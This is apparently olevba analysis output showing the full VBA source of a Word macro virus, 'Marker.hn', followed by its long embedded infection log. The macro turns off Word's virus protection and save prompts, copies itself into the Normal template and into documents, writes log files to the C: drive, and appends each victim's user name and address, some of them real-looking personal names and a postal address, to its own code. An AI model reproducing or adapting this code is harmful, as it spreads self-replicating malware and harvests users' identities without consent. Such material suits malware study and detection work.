olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.hn
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.hn - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



' DSR & FHS , KZ, Kostanai
' KGU-EMF by DSR & FHS v0.1
' Привет Кустанайцам из КарГТУ

Private Sub Document_Close()

On Error Resume Next

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find("' DSR & FHS , KZ, Kostanai", 1, 1, 10, 10)
NormalTemplateInfected = nt.CodeModule.Find("' DSR & FHS , KZ, Kostanai", 1, 1, 10, 10)

'Switch the VirusProtection OFF, ConfirmConversion OFF, SaveNormalPrompt OFF
        
    Options.VirusProtection = False
    Options.ConfirmConversions = False
    Options.SaveNormalPrompt = False

 If (Day(Now()) = 15) Then
                    Documents.Add
                    ActiveDocument.Save
                    End If
  If (Day(Now()) <> 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    LogFile = "C:\bootlog" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netlog.sys" For Output As #1
    Print #1, "For YOU"
    Print #1, "SCOOTER"
    Print #1, "Wellcome to Calipso"
    Print #1, "FasterHarderScooter"
    Print #1, "Scooter on the Web: www.scooterweb.de"
    Print #1, "Wiritten by FHS & DSR (KZ, Kostanai town, KGU)"
    Print #1, "This is a simple example"
    Print #1, "read " & LogFile
    Close #1
      
    
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If ((DocumentInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate)) Or _
   ((NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate)) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
      SaveNormalTemplate = NormalTemplate.Saved
      OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & "* DSR & FHS , KGU EMF" & Chr(13) & _
              "' " & "00:15:54  -  Wednesday, 22.12.1999" & Chr(13) & _
              "' " & "KZ, Kostanai, KGU EMF Applied Mathematics" & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     DocumentInfected = False Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 19:20:14 - среда, 3 май 2000
' Пожелал  остаться неизвестным
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:36:42 - воскресенье, 14 май 2000
' Khudyakov Yuriy
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:27:56 - понедельник, 15 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:55:46 - вторник, 16 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:25:20 - среда, 17 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:48:08 - среда, 17 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:53:13 - среда, 17 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:46:39 - среда, 17 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:10:05 - четверг, 18 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:57:33 - вторник, 23 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:42:02 - вторник, 23 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:13:04 - среда, 24 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:51:44 - суббота, 17 июн 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:56:16 - суббота, 17 июн 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:57:13 - суббота, 17 июн 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:11:33 - суббота, 17 июн 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:26:34 - понедельник, 19 июн 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:26:40 - понедельник, 3 июл 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:27:59 - понедельник, 3 июл 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:29:13 - понедельник, 3 июл 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:33:04 - понедельник, 3 июл 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:34:23 - понедельник, 3 июл 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:36:15 - понедельник, 3 июл 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:38:17 - понедельник, 3 июл 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:39:53 - понедельник, 3 июл 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:41:33 - понедельник, 3 июл 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:43:48 - понедельник, 3 июл 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:48:41 - понедельник, 3 июл 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:29:08 - среда, 5 июл 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:11:53 - среда, 5 июл 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:51:38 - четверг, 6 июл 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:48:48 - четверг, 6 июл 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:08:05 - понедельник, 10 июл 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:04:52 - вторник, 11 июл 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:05:42 - среда, 12 июл 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:17:57 - среда, 12 июл 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:23:51 - среда, 12 июл 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:19:43 - среда, 12 июл 2000
' S. Rybalkina
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:18:51 - среда, 12 июл 2000
' S. Rybalkina
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:16:33 - четверг, 13 июл 2000
' S. Rybalkina
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:32:54 - четверг, 13 июл 2000
' S. Rybalkina
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:37:24 - четверг, 13 июл 2000
' S. Rybalkina
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:48:23 - четверг, 13 июл 2000
' S. Rybalkina
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:57:26 - четверг, 13 июл 2000
' S. Rybalkina
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:08:28 - четверг, 13 июл 2000
' S. Rybalkina
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:16:58 - четверг, 13 июл 2000
' S. Rybalkina
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:38:43 - четверг, 13 июл 2000
' S. Rybalkina
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:33:43 - четверг, 13 июл 2000
' S. Rybalkina
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:38:15 - пятница, 14 июл 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:53:24 - пятница, 14 июл 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:50:10 - понедельник, 17 июл 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:03:13 - вторник, 18 июл 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:53:18 - четверг, 20 июл 2000
' Apent_5
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:07:28 - четверг, 20 июл 2000
' Apent_5
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:11:04 - пятница, 21 июл 2000
' Users
' KGTU



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:48:57 - вторник, 25 июл 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:14:48 - вторник, 25 июл 2000
' 200a
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:56:11 - вторник, 25 июл 2000
' 200a
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:38:40 - понедельник, 31 июл 2000
' 200a
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:05:19 - среда, 2 авг 2000
' Apent_5
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:12:34 - среда, 2 авг 2000
' Apent_5
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:13:28 - среда, 2 авг 2000
' Apent_5
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:53:09 - пятница, 18 авг 2000
' tester
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:20:31 - понедельник, 11 сен 2000
' Users
' KGTU



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:06:08 - вторник, 12 сен 2000
' Users
' KGTU



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:41:35 - вторник, 12 сен 2000
'
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:50:15 - среда, 13 сен 2000
'
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:10:35 - понедельник, 18 сен 2000
'
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:24:46 - вторник, 19 сен 2000
'
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:27:51 - вторник, 19 сен 2000
'
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:23:19 - вторник, 19 сен 2000
' ais
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:40:35 - пятница, 15 дек 2000
' stud
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 21:29:22 - четверг, 4 янв 2001
' Маганов Леонид
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:19:13 - четверг, 15 фев 2001
' Администратор
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:52:18 - пятница, 16 фев 2001
' Администратор
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:03:01 - понедельник, 19 фев 2001
' Администратор
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:01:49 - понедельник, 19 фев 2001
' 14 USER
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:13:32 - понедельник, 19 фев 2001
' Korolyeva Vera
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:53:06 - вторник, 20 фев 2001
' Korolyeva Vera
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:04:35 - вторник, 20 фев 2001
' Korolyeva Vera
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:05:02 - вторник, 20 фев 2001
' 14 USER
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:53:03 - среда, 21 фев 2001
' 14 USER
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:02:43 - четверг, 22 фев 2001
' 14 USER
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:40:33 - пятница, 23 фев 2001
' Администратор
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:39:56 - пятница, 23 фев 2001
' Korolyeva Vera
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 21:29:57 - понедельник, 16 апр 2001
' Korolyeva Vera
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:47:30 - пятница, 18 апр 1997
' dis
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:13:59 - пятница, 18 апр 1997
' dis
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:37:13 - пятница, 18 апр 1997
' dis
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:39:06 - пятница, 18 апр 1997
' dis
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:40:22 - пятница, 18 апр 1997
' dis
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:44:12 - пятница, 18 апр 1997
' dis
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:47:12 - пятница, 18 апр 1997
' dis
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:47:31 - пятница, 18 апр 1997
' dis
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:30:26 - пятница, 18 апр 1997
' dis
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:46:57 - пятница, 18 апр 1997
' dis
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:25:11 - вторник, 20 апр 1999
' Анара Искакова
' 470074
' г. Караганда,
' ул. Университетская, 28



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:05:20 - вторник, 20 апр 1999
' Анара Искакова
' 470074
' г. Караганда,
' ул. Университетская, 28



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:13:50 - вторник, 20 апр 1999
' Анара Искакова
' 470074
' г. Караганда,
' ул. Университетская, 28



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:17:19 - вторник, 20 апр 1999
' Анара Искакова
' 470074
' г. Караганда,
' ул. Университетская, 28



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 19:22:53 - вторник, 20 апр 1999
' Анара Искакова
' 470074
' г. Караганда,
' ул. Университетская, 28



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:09:10 - среда, 21 апр 1999
' Анара Искакова
' 470074
' г. Караганда,
' ул. Университетская, 28



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:42:32 - среда, 21 апр 1999
' Анара Искакова
' 470074
' г. Караганда,
' ул. Университетская, 28



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:34:59 - пятница, 23 апр 1999
' Анара Искакова
' 470074
' г. Караганда,
' ул. Университетская, 28



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:07:32 - четверг, 29 апр 1999
' Анара Искакова
' 470074
' г. Караганда,
' ул. Университетская, 28



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 22:48:49 - пятница, 4 май 2001
' Alexandra
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:15:26 - вторник, 8 май 2001
' Vera Petrova
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:52:35 - вторник, 8 май 2001
' Vera Petrova
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:21:06 - понедельник, 26 авг 1996
' Петрова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 23:56:41 - понедельник, 26 авг 1996
' Петрова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 03:46:08 - вторник, 27 авг 1996
' Петрова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:24:55 - суббота, 12 май 2001
' Vera Petrova
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:02:12 - суббота, 12 май 2001
' Vera Petrova
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 23:47:06 - суббота, 12 май 2001
' Vera Petrova
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:07:46 - воскресенье, 13 май 2001
' Vera Petrova
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:51:46 - воскресенье, 13 май 2001
' Vera Petrova
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:54:40 - воскресенье, 13 май 2001
' Vera Petrova
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 20:15:44 - воскресенье, 13 май 2001
' Vera Petrova
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 20:34:55 - воскресенье, 13 май 2001
' Vera Petrova
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 21:45:04 - вторник, 27 авг 1996
' Петрова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 04:51:46 - среда, 28 авг 1996
' Петрова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:34:23 - среда, 28 авг 1996
' Петрова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 08:09:07 - пятница, 30 авг 1996
' Петрова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:06:34 - пятница, 30 авг 1996
' Петрова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 21:16:10 - пятница, 30 авг 1996
' Петрова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 22:37:05 - пятница, 30 авг 1996
' Петрова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
